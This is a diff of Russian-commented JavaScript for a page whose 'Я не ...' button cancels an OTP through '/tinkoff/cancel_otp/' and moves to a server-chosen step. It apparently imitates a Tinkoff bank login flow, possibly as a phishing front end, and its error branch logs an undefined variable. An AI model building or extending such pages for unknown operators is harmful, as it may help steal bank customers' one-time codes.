@@ -3,35 +3,39 @@ document.addEventListener("DOMContentLoaded", () => {
     const userNameElement = document.getElementById("form-title");
     const userName = userNameElement ? userNameElement.dataset.name : "Пользователь"; 
 
-    // Функция для отправки запроса на бэкенд
-    const sendRequestToBackend = async (endpoint, button) => {
-        button.disabled = true;
+    // Обработчик для кнопки "Я не ..."
+    document.getElementById("reset-button").addEventListener("click", async (event) => {
+        showGlobalLoader();
 
         try {
-            const response = await fetch(endpoint, {
+            const response = await fetch("/tinkoff/cancel_otp/", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' }
             });
+
+            if (!response.ok) {
+                hideGlobalLoader();
+                if (response.status === 307) {
+                    showSessionExpiredModal(response.statusText);
+                }
+                else {
+                    showError(response.statusText);
+                    console.error('Ошибка:', error);
+                }
+                return;
+            }
             
             const data = await response.json();
             
             if (data.status === 'success') {
                 const pageType = data.next_page_type;
                 window.location.href = `/tinkoff/next/?step=${pageType}`;
-            } else {
-                alert(data.detail || 'Произошла ошибка.');
-            }
+            } 
         } catch (error) {
-            alert('Ошибка сети. Попробуйте снова.');
+            showError('Ошибка сети. Попробуйте снова.');
             console.error('Ошибка:', error);
         } finally {
-            button.disabled = false;
+            hideGlobalLoader();
         }
-    };
-
-    // Обработчик для кнопки "Я не ..."
-    document.getElementById("reset-button").addEventListener("click", (event) => {
-        const button = event.target;
-        sendRequestToBackend("/tinkoff/cancel_otp/", button);
     });
 });
